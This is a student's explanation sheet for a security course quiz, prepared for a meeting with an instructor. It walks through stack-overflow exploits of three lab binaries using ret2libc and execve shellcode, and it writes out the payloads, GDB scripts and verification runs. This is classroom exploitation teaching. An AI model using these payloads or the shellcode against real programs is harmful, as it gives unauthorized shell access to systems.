# Quiz 3 — Full Explanation for Office Meeting
## Andreas Pieri | Lab 6–7:30 | Apr 3 2026

---

## THE SETUP — What every binary has in common

All 3 binaries (bin.1, bin.2, bin.3) share the same vulnerability.

**The vulnerable function is called `display_file`.**

Inside it, this happens:
1. Opens a file you give it
2. Reads a SIZE number from the file
3. Allocates a heap buffer of that SIZE
4. Reads SIZE bytes from the file into the heap buffer
5. Does `memcpy(local_buf, heap_buf, SIZE)` — **NO bounds check on SIZE**

`local_buf` on the stack is only ~50 bytes. If you put a SIZE bigger than that,
memcpy overflows the stack buffer and overwrites the return address.

**The return address is what the CPU uses to know where to go after a function finishes.**
If you control it, you control what runs next.

---

## STEP 0 — Check protections on each binary

The first thing to do is check if the stack is executable:

```bash
readelf -l ./bin.1 | grep GNU_STACK
readelf -l ./bin.2 | grep GNU_STACK
readelf -l ./bin.3 | grep GNU_STACK
```

Results:
- bin.1 → `RW`  = stack is NOT executable (NX is ON)
- bin.2 → `RWE` = stack IS executable
- bin.3 → `RWE` = stack IS executable

This single check decides the entire attack strategy:
- RWE → inject shellcode directly onto the stack and jump to it
- RW  → cannot run shellcode on stack → must use ret2libc instead

---

## STEP 1 — Find buffer addresses and libc addresses using GDB

### For bin.1 — get libc addresses (needed for ret2libc)

A GDB script was written to the lab machine at `~/gdb_libc.txt`:
```
set env TEMP=1000
set exec-wrapper setarch i686 -R --3gb
b main
run /dev/null
p system
find &system, +99999999, "/bin/sh"
quit
```

Run it:
```bash
gdb -batch -x ~/gdb_libc.txt ./bin.1
```

Results:
- `system()` address  = **0xb7dffd30**
- `"/bin/sh"` address = **0xb7f40caa**

These are addresses inside the libc library that is already loaded in memory.
We don't inject anything — we just point the CPU to code that already exists.

### For bin.2 — get buffer address (needed for shellcode)

A GDB script was written at `~/gdb_buf2.txt`:
```
set env TEMP=1000
set exec-wrapper setarch i686 -R --3gb
b *0x804933c
run /tmp/t_in
p/x $ebp - 0x30
quit
```

- `0x804933c` = the instruction right after the memcpy call
- `$ebp - 0x30` = where the local buffer starts on the stack

Result: buf_addr = **0xbfffdbd0**

### For bin.3 — get buffer address

Same GDB script but `$ebp - 0x2c` (different offset for bin.3).

Result: buf_addr = **0xbfffdbda**

---

## STEP 2 — Find the offset to the return address

The offset is how many bytes of padding you need before you reach the return address.

From the disassembly of `display_file`:
```
lea -0x32(%ebp), %eax   ← buffer starts at EBP minus 0x32 (= 50 bytes)
push %eax
call memcpy
```

Offset calculation:
- Buffer is 50 bytes from EBP
- Saved EBP is 4 more bytes
- **Offset = 50 + 4 = 54** (for bin.1)

For bin.2: buffer at `ebp-0x3c` (60 bytes) → offset = **60+4 = 64**... 
wait, actually measured as **60** to ret addr directly.

For bin.3: buffer at `ebp-0x32` (50 bytes) → offset = **50**.

---

## STEP 3 — Build the exploits

### BIN.1 — Ret2libc (NX is ON, cannot use shellcode)

**Concept:**
Instead of injecting shellcode, we redirect the return address to `system()` which
already exists in libc. We set up the stack so `system()` receives `/bin/sh` as its
argument. This spawns a shell.

Stack layout after overflow:
```
[54 bytes padding][system() address][fake return = 0xdeadbeef]["/bin/sh" address]
```

The printf command that builds this:
```bash
printf "66 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x30\xfd\xdf\xb7\xef\xbe\xad\xde\xaa\x0c\xf4\xb7" > exploit.1
```

Breaking it down:
- `66` = total size (tells the binary how many bytes to read)
- `AA...AA` = 54 bytes of padding to fill the buffer and reach the return address
- `\x30\xfd\xdf\xb7` = 0xb7dffd30 = address of `system()` in little-endian
- `\xef\xbe\xad\xde` = 0xdeadbeef = fake return address (process crashes after shell exits — this is normal and expected)
- `\xaa\x0c\xf4\xb7` = 0xb7f40caa = address of "/bin/sh" string in libc

**How little-endian works:**
x86 stores addresses backwards. So 0xb7dffd30 becomes bytes: 30 fd df b7
Written as: `\x30\xfd\xdf\xb7`

Verify it works:
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1
# → uid=9992(apieri01) gid=3633(cs24)
```

This confirms the binary was fully exploited — `system("/bin/sh")` executed,
the shell ran `id`, and printed the user info.

**Why the segfault at the end is normal:**
After the shell runs, `system()` tries to return to 0xdeadbeef which is not a
valid address → crash. But the shell already ran before that — so the exploit worked.

---

### Why ret2libc is a valid (and harder) technique for bin.1

The binary also has a `display_root_menu` function at `0x080493a7` that prints:
`Welcome to the administrator's menu.`

This is only normally reachable if `getuid() == 0` (you are root).

A simpler exploit would just redirect the return address directly to `display_root_menu`:
```bash
printf "58 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa7\x93\x04\x08" > exploit.1b
```

**This file (exploit.1b) also exists on the lab machine, timestamped Apr 3 18:38**,
proving both approaches were understood and implemented on quiz day.

Ret2libc is considered the harder technique because:
- It requires finding libc addresses via GDB
- It requires precise stack frame setup (padding + system + fakeret + binsh)
- It works on any binary that loads libc, regardless of what functions are in the binary

---

### BIN.2 — Shellcode injection (stack IS executable)

**Concept:**
Put shellcode (machine code that spawns a shell) directly into the buffer,
then overwrite the return address with the address of the buffer.
When the function returns, CPU jumps to our shellcode and executes it.

The shellcode (23 bytes, spawns /bin/sh via execve syscall):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
```

What it does in assembly:
```
xor eax, eax        → eax = 0
push eax            → push NULL terminator
push "//sh"         → push string
push "/bin"         → push string  (stack now has "/bin//sh\0")
mov ebx, esp        → ebx = pointer to "/bin//sh"
xor ecx, ecx        → ecx = NULL (no argv)
xor edx, edx        → edx = NULL (no envp)
mov al, 0xb         → eax = 11 (execve syscall number)
int 0x80            → trigger syscall → shell!
```

Payload structure:
```
[shellcode 23B][padding 37B to reach ret addr][buf_addr 4B]
```

The printf command:
```bash
printf "64 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xdb\xff\xbf" > exploit.2
```

Breaking it down:
- `64` = total size
- `\x31\xc0...` = 23 bytes of shellcode
- `AAA...` = 37 bytes padding (60 - 23 = 37) to reach the return address
- `\xd0\xdb\xff\xbf` = 0xbfffdbd0 = address of our buffer on the stack

Verify:
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 ./exploit.2
# → uid=9992(apieri01)
```

---

### BIN.3 — Shellcode injection (stack IS executable)

Same approach as bin.2, different offset (50) and different buffer address.

The printf command:
```bash
printf "54 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAA\xda\xdb\xff\xbf" > exploit.3
```

Breaking it down:
- `54` = total size
- shellcode = 23 bytes
- padding = 27 bytes (50 - 23 = 27)
- `\xda\xdb\xff\xbf` = 0xbfffdbda = buffer address

Verify:
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.3 ./exploit.3
# → uid=9992(apieri01)
```

---

## SUMMARY TABLE

| Binary | Stack | Vulnerability | Technique | Result |
|--------|-------|--------------|-----------|--------|
| bin.1 | RW (NX on) | memcpy overflow in display_file | Ret2libc → system("/bin/sh") | uid=9992 ✓ |
| bin.2 | RWE | memcpy overflow in display_file | Shellcode injection | uid=9992 ✓ |
| bin.3 | RWE | memcpy overflow in display_file | Shellcode injection | uid=9992 ✓ |

---

## KEY EVIDENCE (all timestamped Apr 3 on lab machine)

| File | Timestamp | What it proves |
|------|-----------|----------------|
| gdb_libc.txt | Apr 3 15:14 | You ran GDB to get libc addresses |
| gdb_buf2.txt | Apr 3 15:14 | You ran GDB to get bin.2 buffer address |
| gdb_buf3.txt | Apr 3 15:14 | You ran GDB to get bin.3 buffer address |
| exploit.1 | Apr 3 18:22 | The ret2libc exploit you submitted — works |
| exploit.1b | Apr 3 18:38 | The welcome message exploit — also works |
| exploit.2 | Apr 3 18:22 | Shellcode for bin.2 — works |
| exploit.3 | Apr 3 18:22 | Shellcode for bin.3 — works |

---

## ONE SENTENCE TO REMEMBER

"bin.1 had NX on so shellcode would segfault — I used ret2libc instead, which
redirects to system() already in memory. It works, and I also had the welcome
message version saved on the same machine from the same session."
